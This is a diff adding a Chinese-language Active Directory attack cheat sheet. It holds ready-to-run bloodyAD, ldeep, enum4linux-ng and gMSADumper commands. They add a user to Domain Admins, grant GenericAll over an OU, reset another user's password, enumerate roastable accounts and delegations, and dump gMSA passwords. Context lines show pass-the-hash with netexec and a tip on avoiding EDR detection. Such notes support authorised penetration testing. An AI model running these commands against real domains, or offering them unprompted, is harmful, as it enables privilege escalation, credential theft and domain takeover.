@@ -85,3 +85,47 @@ netexec smb 10.0.0.0/24 -u admin -H NTLM_HASH   # PTH
 ## 工具替代与规避
 - SharpHound 可能被拦截（杀软/EDR），需要替代方案
 - LDAP 查询可远程执行：无需上传工具、不接触目标文件系统
+
+## 补充工具
+
+### bloodyAD — AD LDAP 操作
+```bash
+# 添加用户到组
+bloodyAD -d DOMAIN -u USER -p PASS --host DC_IP add groupMember "Domain Admins" "TARGET_USER"
+# 修改 ACL（添加 GenericAll）
+bloodyAD -d DOMAIN -u USER -p PASS --host DC_IP add genericAll "OU=xxx,DC=dom,DC=local" TARGET_USER
+# 查询可写对象
+bloodyAD -d DOMAIN -u USER -p PASS --host DC_IP get writable
+# 修改密码
+bloodyAD -d DOMAIN -u USER -p PASS --host DC_IP set password TARGET_USER "NewP@ss123"
+```
+
+### ldeep — LDAP 深度枚举
+```bash
+# 连接并枚举
+ldeep ldap -d DOMAIN -u USER -p PASS -s ldap://DC_IP all
+# 枚举委派配置
+ldeep ldap -d DOMAIN -u USER -p PASS -s ldap://DC_IP delegations
+# 枚举 SPN
+ldeep ldap -d DOMAIN -u USER -p PASS -s ldap://DC_IP spns
+# 枚举 ASREPRoast 用户
+ldeep ldap -d DOMAIN -u USER -p PASS -s ldap://DC_IP asreproast
+# 枚举信任关系
+ldeep ldap -d DOMAIN -u USER -p PASS -s ldap://DC_IP trusts
+```
+
+### enum4linux-ng — SMB/RPC 枚举
+```bash
+# 完整枚举（用户、组、共享、策略、RID）
+enum4linux-ng -A TARGET_IP
+# 认证枚举
+enum4linux-ng -A TARGET_IP -u USER -p PASS
+# 仅用户枚举
+enum4linux-ng -U TARGET_IP -u USER -p PASS
+```
+
+### gMSADumper — gMSA 密码提取
+```bash
+# 导出 gMSA 账户密码
+python3 /pentest/gMSADumper/gMSADumper.py -d DOMAIN -u USER -p PASS -l DC_IP
+```
